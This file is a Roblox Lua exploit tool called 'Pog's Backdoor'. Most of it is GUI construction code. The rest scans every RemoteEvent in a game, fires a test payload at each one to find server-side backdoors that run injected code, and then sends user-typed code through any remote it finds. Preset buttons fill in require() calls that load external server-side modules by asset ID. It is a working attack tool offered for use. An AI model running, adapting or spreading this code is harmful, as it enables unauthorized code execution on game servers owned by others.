-- Pog's Backdoor
-- 0.0.3








































































































































-- Instances:
local Pog = Instance.new("ScreenGui")
local Frame_1 = Instance.new("Frame")
local UICorner_1 = Instance.new("UICorner")
local UIStroke_1 = Instance.new("UIStroke")
local UIGradient_1 = Instance.new("UIGradient")
local Check_1 = Instance.new("TextLabel")
local FrameExec_1 = Instance.new("Frame")
local BtnExecute_1 = Instance.new("TextButton")
local UIStroke_2 = Instance.new("UIStroke")
local UICorner_2 = Instance.new("UICorner")
local UIStroke_3 = Instance.new("UIStroke")
local BtnClear_1 = Instance.new("TextButton")
local UIStroke_4 = Instance.new("UIStroke")
local UICorner_3 = Instance.new("UICorner")
local UIStroke_5 = Instance.new("UIStroke")
local Txt_1 = Instance.new("TextBox")
local UIStroke_6 = Instance.new("UIStroke")
local UICorner_4 = Instance.new("UICorner")
local BtnScripts_1 = Instance.new("TextButton")
local UIStroke_7 = Instance.new("UIStroke")
local UIGradient_2 = Instance.new("UIGradient")
local UICorner_5 = Instance.new("UICorner")
local FrameScripts_1 = Instance.new("Frame")
local UIStroke_8 = Instance.new("UIStroke")
local UIGradient_3 = Instance.new("UIGradient")
local UICorner_6 = Instance.new("UICorner")
local Btn1_1 = Instance.new("TextButton")
local UIStroke_9 = Instance.new("UIStroke")
local UICorner_7 = Instance.new("UICorner")
local UIStroke_10 = Instance.new("UIStroke")
local Btn2_1 = Instance.new("TextButton")
local UIStroke_11 = Instance.new("UIStroke")
local UICorner_8 = Instance.new("UICorner")
local UIStroke_12 = Instance.new("UIStroke")
local Title_1 = Instance.new("TextLabel")
local Btn3_1 = Instance.new("TextButton")
local UIStroke_13 = Instance.new("UIStroke")
local UICorner_9 = Instance.new("UICorner")
local UIStroke_14 = Instance.new("UIStroke")
local Title_2 = Instance.new("TextLabel")
local Minimizer_1 = Instance.new("TextButton")
local UIStroke_15 = Instance.new("UIStroke")
local UIGradient_4 = Instance.new("UIGradient")
local UICorner_10 = Instance.new("UICorner")

-- Properties:
Pog.Name = "Pog"
Pog.Parent = game.CoreGui
Pog.DisplayOrder = 99999
Pog.ResetOnSpawn = false
Pog.ZIndexBehavior = Enum.ZIndexBehavior.Global

Frame_1.Parent = Pog
Frame_1.BackgroundColor3 = Color3.fromRGB(32,32,32)
Frame_1.BackgroundTransparency = 0.20000000298023224
Frame_1.BorderColor3 = Color3.fromRGB(0,0,0)
Frame_1.BorderSizePixel = 0
Frame_1.Position = UDim2.new(0.301925987, 116,0.290932, 16)
Frame_1.Size = UDim2.new(0, 520,0, 266)

UICorner_1.Parent = Frame_1

UIStroke_1.Parent = Frame_1
UIStroke_1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_1.Color = Color3.fromRGB(255,255,255)
UIStroke_1.Thickness = 3

UIGradient_1.Parent = UIStroke_1
UIGradient_1.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.116, Color3.fromRGB(255, 170, 0)), ColorSequenceKeypoint.new(0.212, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.334, Color3.fromRGB(170, 255, 127)), ColorSequenceKeypoint.new(0.436, Color3.fromRGB(0, 255, 127)), ColorSequenceKeypoint.new(0.536, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.629, Color3.fromRGB(170, 0, 255)), ColorSequenceKeypoint.new(0.727, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(0.844, Color3.fromRGB(255, 170, 255)), ColorSequenceKeypoint.new(0.99481, Color3.fromRGB(255, 233, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(234, 220, 235))}

Check_1.Name = "Check"
Check_1.Parent = Frame_1
Check_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
Check_1.BackgroundTransparency = 1
Check_1.BorderColor3 = Color3.fromRGB(0,0,0)
Check_1.BorderSizePixel = 0
Check_1.Position = UDim2.new(0.00192307692, 0,0.304511279, 0)
Check_1.Size = UDim2.new(0, 519,0, 104)
Check_1.Font = Enum.Font.SourceSans
Check_1.Text = "Checking for backdoor...\nIf your game froze - dw, its scanning!"
Check_1.TextColor3 = Color3.fromRGB(255,255,255)
Check_1.TextScaled = true
Check_1.TextSize = 14
Check_1.TextStrokeTransparency = 0
Check_1.TextWrapped = true

FrameExec_1.Name = "FrameExec"
FrameExec_1.Parent = Frame_1
FrameExec_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
FrameExec_1.BackgroundTransparency = 1
FrameExec_1.BorderColor3 = Color3.fromRGB(0,0,0)
FrameExec_1.BorderSizePixel = 0
FrameExec_1.Size = UDim2.new(0, 519,0, 266)
FrameExec_1.Visible = false

BtnExecute_1.Name = "BtnExecute"
BtnExecute_1.Parent = FrameExec_1
BtnExecute_1.Active = true
BtnExecute_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
BtnExecute_1.BackgroundTransparency = 1
BtnExecute_1.BorderColor3 = Color3.fromRGB(0,0,0)
BtnExecute_1.BorderSizePixel = 0
BtnExecute_1.Position = UDim2.new(0.0783986598, 0,0.755639076, 0)
BtnExecute_1.Size = UDim2.new(0, 200,0, 50)
BtnExecute_1.Font = Enum.Font.SourceSans
BtnExecute_1.Text = "Execute"
BtnExecute_1.TextColor3 = Color3.fromRGB(255,255,255)
BtnExecute_1.TextScaled = true
BtnExecute_1.TextSize = 14
BtnExecute_1.TextWrapped = true

UIStroke_2.Parent = BtnExecute_1
UIStroke_2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_2.Color = Color3.fromRGB(57,57,57)
UIStroke_2.Thickness = 2

UICorner_2.Parent = BtnExecute_1

UIStroke_3.Parent = BtnExecute_1
UIStroke_3.Color = Color3.fromRGB(57,57,57)
UIStroke_3.Thickness = 2

BtnClear_1.Name = "BtnClear"
BtnClear_1.Parent = FrameExec_1
BtnClear_1.Active = true
BtnClear_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
BtnClear_1.BackgroundTransparency = 1
BtnClear_1.BorderColor3 = Color3.fromRGB(0,0,0)
BtnClear_1.BorderSizePixel = 0
BtnClear_1.Position = UDim2.new(0.534656584, 0,0.755639076, 0)
BtnClear_1.Size = UDim2.new(0, 200,0, 50)
BtnClear_1.Font = Enum.Font.SourceSans
BtnClear_1.Text = "Clear"
BtnClear_1.TextColor3 = Color3.fromRGB(255,255,255)
BtnClear_1.TextScaled = true
BtnClear_1.TextSize = 14
BtnClear_1.TextWrapped = true

UIStroke_4.Parent = BtnClear_1
UIStroke_4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_4.Color = Color3.fromRGB(57,57,57)
UIStroke_4.Thickness = 2

UICorner_3.Parent = BtnClear_1

UIStroke_5.Parent = BtnClear_1
UIStroke_5.Color = Color3.fromRGB(57,57,57)
UIStroke_5.Thickness = 2

Txt_1.Name = "Txt"
Txt_1.Parent = FrameExec_1
Txt_1.Active = true
Txt_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
Txt_1.BackgroundTransparency = 1
Txt_1.BorderColor3 = Color3.fromRGB(0,0,0)
Txt_1.BorderSizePixel = 0
Txt_1.ClearTextOnFocus = false
Txt_1.MultiLine = true
Txt_1.Position = UDim2.new(0.0494969226, 0,0.176691726, 0)
Txt_1.Size = UDim2.new(0, 468,0, 140)
Txt_1.Font = Enum.Font.Ubuntu
Txt_1.PlaceholderText = "Code here..."
Txt_1.Text = ""
Txt_1.TextColor3 = Color3.fromRGB(255,255,255)
Txt_1.TextSize = 18
Txt_1.TextStrokeTransparency = 0
Txt_1.TextWrapped = true
Txt_1.TextXAlignment = Enum.TextXAlignment.Left
Txt_1.TextYAlignment = Enum.TextYAlignment.Top

UIStroke_6.Parent = Txt_1
UIStroke_6.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_6.Color = Color3.fromRGB(57,57,57)
UIStroke_6.Thickness = 2

UICorner_4.Parent = Txt_1

BtnScripts_1.Name = "BtnScripts"
BtnScripts_1.Parent = FrameExec_1
BtnScripts_1.Active = true
BtnScripts_1.BackgroundColor3 = Color3.fromRGB(32,32,32)
BtnScripts_1.BackgroundTransparency = 0.20000000298023224
BtnScripts_1.BorderColor3 = Color3.fromRGB(0,0,0)
BtnScripts_1.BorderSizePixel = 0
BtnScripts_1.Position = UDim2.new(0, 0,1.02631581, 0)
BtnScripts_1.Size = UDim2.new(0, 519,0, 37)
BtnScripts_1.Font = Enum.Font.SourceSans
BtnScripts_1.Text = "↓Scripts↓"
BtnScripts_1.TextColor3 = Color3.fromRGB(255,255,255)
BtnScripts_1.TextScaled = true
BtnScripts_1.TextSize = 50
BtnScripts_1.TextWrapped = true

UIStroke_7.Parent = BtnScripts_1
UIStroke_7.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_7.Color = Color3.fromRGB(255,255,255)
UIStroke_7.Thickness = 2

UIGradient_2.Parent = UIStroke_7
UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.116, Color3.fromRGB(255, 170, 0)), ColorSequenceKeypoint.new(0.212, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.334, Color3.fromRGB(170, 255, 127)), ColorSequenceKeypoint.new(0.436, Color3.fromRGB(0, 255, 127)), ColorSequenceKeypoint.new(0.536, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.629, Color3.fromRGB(170, 0, 255)), ColorSequenceKeypoint.new(0.727, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(0.844, Color3.fromRGB(255, 170, 255)), ColorSequenceKeypoint.new(0.99481, Color3.fromRGB(255, 233, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(234, 220, 235))}

UICorner_5.Parent = BtnScripts_1

FrameScripts_1.Name = "FrameScripts"
FrameScripts_1.Parent = FrameExec_1
FrameScripts_1.BackgroundColor3 = Color3.fromRGB(32,32,32)
FrameScripts_1.BackgroundTransparency = 0.20000000298023224
FrameScripts_1.BorderColor3 = Color3.fromRGB(0,0,0)
FrameScripts_1.BorderSizePixel = 0
FrameScripts_1.Position = UDim2.new(0, 0,1.19548869, 0)
FrameScripts_1.Size = UDim2.new(0, 520,0, 217)
FrameScripts_1.Visible = false

UIStroke_8.Parent = FrameScripts_1
UIStroke_8.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_8.Color = Color3.fromRGB(255,255,255)
UIStroke_8.Thickness = 3

UIGradient_3.Parent = UIStroke_8
UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.116, Color3.fromRGB(255, 170, 0)), ColorSequenceKeypoint.new(0.212, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.334, Color3.fromRGB(170, 255, 127)), ColorSequenceKeypoint.new(0.436, Color3.fromRGB(0, 255, 127)), ColorSequenceKeypoint.new(0.536, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.629, Color3.fromRGB(170, 0, 255)), ColorSequenceKeypoint.new(0.727, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(0.844, Color3.fromRGB(255, 170, 255)), ColorSequenceKeypoint.new(0.99481, Color3.fromRGB(255, 233, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(234, 220, 235))}

UICorner_6.Parent = FrameScripts_1

Btn1_1.Name = "Btn1"
Btn1_1.Parent = FrameScripts_1
Btn1_1.Active = true
Btn1_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
Btn1_1.BackgroundTransparency = 1
Btn1_1.BorderColor3 = Color3.fromRGB(0,0,0)
Btn1_1.BorderSizePixel = 0
Btn1_1.Position = UDim2.new(0.0314690284, 0,0.0451127812, 0)
Btn1_1.Size = UDim2.new(0, 173,0, 50)
Btn1_1.Font = Enum.Font.SourceSans
Btn1_1.Text = "Polaria"
Btn1_1.TextColor3 = Color3.fromRGB(255,255,255)
Btn1_1.TextScaled = true
Btn1_1.TextSize = 14
Btn1_1.TextWrapped = true

UIStroke_9.Parent = Btn1_1
UIStroke_9.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_9.Color = Color3.fromRGB(57,57,57)
UIStroke_9.Thickness = 2

UICorner_7.Parent = Btn1_1

UIStroke_10.Parent = Btn1_1
UIStroke_10.Color = Color3.fromRGB(57,57,57)
UIStroke_10.Thickness = 2

Btn2_1.Name = "Btn2"
Btn2_1.Parent = FrameScripts_1
Btn2_1.Active = true
Btn2_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
Btn2_1.BackgroundTransparency = 1
Btn2_1.BorderColor3 = Color3.fromRGB(0,0,0)
Btn2_1.BorderSizePixel = 0
Btn2_1.Position = UDim2.new(0.396853626, 0,0.0428087078, 0)
Btn2_1.Size = UDim2.new(0, 173,0, 50)
Btn2_1.Font = Enum.Font.SourceSans
Btn2_1.Text = "ExSer"
Btn2_1.TextColor3 = Color3.fromRGB(255,255,255)
Btn2_1.TextScaled = true
Btn2_1.TextSize = 14
Btn2_1.TextWrapped = true

UIStroke_11.Parent = Btn2_1
UIStroke_11.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_11.Color = Color3.fromRGB(57,57,57)
UIStroke_11.Thickness = 2

UICorner_8.Parent = Btn2_1

UIStroke_12.Parent = Btn2_1
UIStroke_12.Color = Color3.fromRGB(57,57,57)
UIStroke_12.Thickness = 2

Title_1.Name = "Title"
Title_1.Parent = FrameScripts_1
Title_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title_1.BackgroundTransparency = 1
Title_1.BorderColor3 = Color3.fromRGB(0,0,0)
Title_1.BorderSizePixel = 0
Title_1.Position = UDim2.new(0.0307692308, 0,0.660805404, 0)
Title_1.Size = UDim2.new(0, 490,0, 37)
Title_1.Font = Enum.Font.SourceSans
Title_1.Text = "More Scripts Soon!"
Title_1.TextColor3 = Color3.fromRGB(255,255,255)
Title_1.TextScaled = true
Title_1.TextSize = 14
Title_1.TextStrokeTransparency = 0
Title_1.TextWrapped = true

Btn3_1.Name = "Btn3"
Btn3_1.Parent = FrameScripts_1
Btn3_1.Active = true
Btn3_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
Btn3_1.BackgroundTransparency = 1
Btn3_1.BorderColor3 = Color3.fromRGB(0,0,0)
Btn3_1.BorderSizePixel = 0
Btn3_1.Position = UDim2.new(0.031469021, 0,0.330827147, 0)
Btn3_1.Size = UDim2.new(0, 173,0, 50)
Btn3_1.Font = Enum.Font.SourceSans
Btn3_1.Text = "KJ"
Btn3_1.TextColor3 = Color3.fromRGB(255,255,255)
Btn3_1.TextScaled = true
Btn3_1.TextSize = 14
Btn3_1.TextWrapped = true

UIStroke_13.Parent = Btn3_1
UIStroke_13.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_13.Color = Color3.fromRGB(57,57,57)
UIStroke_13.Thickness = 2

UICorner_9.Parent = Btn3_1

UIStroke_14.Parent = Btn3_1
UIStroke_14.Color = Color3.fromRGB(57,57,57)
UIStroke_14.Thickness = 2

Title_2.Name = "Title"
Title_2.Parent = Frame_1
Title_2.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title_2.BackgroundTransparency = 1
Title_2.BorderColor3 = Color3.fromRGB(0,0,0)
Title_2.BorderSizePixel = 0
Title_2.Size = UDim2.new(0, 520,0, 37)
Title_2.Font = Enum.Font.SourceSans
Title_2.Text = "Pog's Backdoor"
Title_2.TextColor3 = Color3.fromRGB(255,255,255)
Title_2.TextScaled = true
Title_2.TextSize = 14
Title_2.TextStrokeTransparency = 0
Title_2.TextWrapped = true

Minimizer_1.Name = "Minimizer"
Minimizer_1.Parent = Pog
Minimizer_1.Active = true
Minimizer_1.BackgroundColor3 = Color3.fromRGB(32,32,32)
Minimizer_1.BackgroundTransparency = 0.20000000298023224
Minimizer_1.BorderColor3 = Color3.fromRGB(0,0,0)
Minimizer_1.BorderSizePixel = 0
Minimizer_1.Position = UDim2.new(0.12958996, 0,0.801007569, 0)
Minimizer_1.Size = UDim2.new(0, 50,0, 45)
Minimizer_1.Font = Enum.Font.SourceSans
Minimizer_1.Text = "-"
Minimizer_1.TextColor3 = Color3.fromRGB(255,255,255)
Minimizer_1.TextSize = 90
Minimizer_1.TextWrapped = true

UIStroke_15.Parent = Minimizer_1
UIStroke_15.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_15.Color = Color3.fromRGB(255,255,255)
UIStroke_15.Thickness = 2

UIGradient_4.Parent = UIStroke_15
UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.116, Color3.fromRGB(255, 170, 0)), ColorSequenceKeypoint.new(0.212, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.334, Color3.fromRGB(170, 255, 127)), ColorSequenceKeypoint.new(0.436, Color3.fromRGB(0, 255, 127)), ColorSequenceKeypoint.new(0.536, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.629, Color3.fromRGB(170, 0, 255)), ColorSequenceKeypoint.new(0.727, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(0.844, Color3.fromRGB(255, 170, 255)), ColorSequenceKeypoint.new(0.99481, Color3.fromRGB(255, 233, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(234, 220, 235))}

UICorner_10.Parent = Minimizer_1

local function rAdKcxXshhbytUjT()
local script = Instance.new("LocalScript",FrameExec_1)

local UserInputService = game:GetService("UserInputService")

local gui = script.Parent

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Parent.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Parent.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
end
coroutine.wrap(rAdKcxXshhbytUjT)()

local function udNFTUCfWJTVptqQ()
local script = Instance.new("LocalScript",Minimizer_1)

local UserInputService = game:GetService("UserInputService")

local gui = script.Parent
game:GetService("RunService").RenderStepped:Connect(function()
	script.Parent.UIStroke.UIGradient.Rotation = (script.Parent.UIStroke.UIGradient.Rotation + 1) % 360
end)

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
end
coroutine.wrap(udNFTUCfWJTVptqQ)()



local function PsGxzsgLMXexCQYx()
local script = Instance.new("LocalScript",Frame_1)
local gradient = script.Parent.UIStroke.UIGradient
game:GetService("RunService").RenderStepped:Connect(function()
	gradient.Rotation = (gradient.Rotation + 1) % 360
	
	script.Parent.FrameExec.BtnScripts.UIStroke.UIGradient.Rotation = (script.Parent.FrameExec.BtnScripts.UIStroke.UIGradient.Rotation + 1) % 360
	script.Parent.FrameExec.FrameScripts.UIStroke.UIGradient.Rotation = (script.Parent.FrameExec.FrameScripts.UIStroke.UIGradient.Rotation + 1) % 360
end)
local UserInputService = game:GetService("UserInputService")

local gui = script.Parent

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
local RunService = game:GetService("RunService")

-- List of known Roblox remote events that are not exploitable
local excludedRemotes = {
    "UpdateCurrentCall",
    "CanChatWith",
    "OnNewMessage",
    "OnMessageDoneFiltering",
    "OnChannelJoined",
    "OnNewSystemMessage",
    -- Add more known Roblox remote events here
}

local remoteEvent = nil
local FinishedFound = false
local remotes = {}
local foundExploit = false  -- global flag to signal that an exploitable remote has been found

-- Function to test if a remote is exploitable
local function testRemote(remote)
    if foundExploit then return end  -- skip if another remote is already found

    local randomId = tostring(math.random(1, 1e6))
    local modelName = "PogBackdoor_" .. randomId
    print("ℹ️ Checking Remote:", remote:GetFullName())

    local foundEvent = false

    local function onAdded(instance)
        if instance.Name == modelName then
            foundEvent = true
        end
    end

    local connection = workspace.DescendantAdded:Connect(onAdded)
    remote:FireServer([[local m=Instance.new("Part") m.Name="]] .. modelName .. [[" m.Parent=workspace]])

    local startTime = tick()
    while tick() - startTime < 0.2 do  -- using a short timeout (~0.2 sec)
        if foundEvent or workspace:FindFirstChild(modelName, true) then
            foundEvent = true
            break
        end
        RunService.Heartbeat:Wait()
    end

    connection:Disconnect()

    if foundEvent then
        print("✅ Backdoor found!")
        if not foundExploit then
            foundExploit = true
            remoteEvent = remote
        end
    else
        print("❌ Remote Backdoor failed", remote:GetFullName())
    end
end

-- Function to find an exploitable remote concurrently
local function findRemote()
    -- Gather all candidate RemoteEvents
    for _, remote in ipairs(game:GetDescendants()) do
        if remote:IsA("RemoteEvent") and not table.find(excludedRemotes, remote.Name) then
            table.insert(remotes, remote)
        end
    end

    -- Test each remote concurrently
    for _, remote in ipairs(remotes) do
        task.spawn(function()
            if not foundExploit then
                testRemote(remote)
            end
        end)
    end

    -- Wait for a short overall duration or until one is found
    local overallTimeout = 5
    local start = tick()
    repeat
        task.wait(0.01)
    until foundExploit or (tick() - start > overallTimeout)

    FinishedFound = true

    if remoteEvent then
        print("✅ Using Backdoor:", remoteEvent:GetFullName())
    else
        print("⚠ No Backdoor found.")
    end
end

-- Function to fire code through the exploitable remote
local function fireRemoteEvent(code)
    if remoteEvent then
        print("ℹ️ Executing code through backdoor:", remoteEvent:GetFullName())
        remoteEvent:FireServer(code)
    else
        warn("⚠ No backdoor found, cannot execute code.")
    end
end
task.wait(0.8)
task.spawn(findRemote)


repeat task.wait() until FinishedFound or remoteEvent
if not remoteEvent then
	script.Parent.Check.Text = "backdoor not found!!"
else
	script.Parent.Check.Visible = false
	script.Parent.FrameExec.Visible = true
	game.StarterGui:SetCore("SendNotification",{
		Title = "Pog Backdoor Scanner",
		Text = "Backdoor found! Backdoor: " .. remoteEvent:GetFullName(),
		Duration = 5
	})
end

local f = script.Parent.FrameExec
f.BtnScripts.MouseButton1Click:Connect(function()
	if f.FrameScripts.Visible == false then
		f.FrameScripts.Visible = true
		f.BtnScripts.Text = "↑Scripts↑"
	else
		f.FrameScripts.Visible = false
		f.BtnScripts.Text = "↓Scripts↓"
	end
end)
script.Parent.Parent.Minimizer.MouseButton1Click:Connect(function()
	if script.Parent.Visible == false then
		script.Parent.Visible = true
		script.Parent.Parent.Minimizer.Text = "-"
	else
		script.Parent.Visible = false
		script.Parent.Parent.Minimizer.Text = "+"
	end
end)
local fs = f.FrameScripts
fs.Btn1.MouseButton1Click:Connect(function()
	f.Txt.Text = 'require(123255432303221):Pload("' .. game.Players.LocalPlayer.Name .. '")'
end)
fs.Btn2.MouseButton1Click:Connect(function()
	f.Txt.Text = 'require(10868847330):pls("' .. game.Players.LocalPlayer.Name .. '")'
end)

f.BtnClear.MouseButton1Click:Connect(function()
	f.Txt.Text = ""
end)
f.BtnExecute.MouseButton1Click:Connect(function()
	fireRemoteEvent(f.Txt.Text)
end)
fs.Btn3.MouseButton1Click:Connect(function()
	f.Txt.Text = 'require(17776365113).kj("' .. game.Players.LocalPlayer.Name .. '")'
end)

end
coroutine.wrap(PsGxzsgLMXexCQYx)()



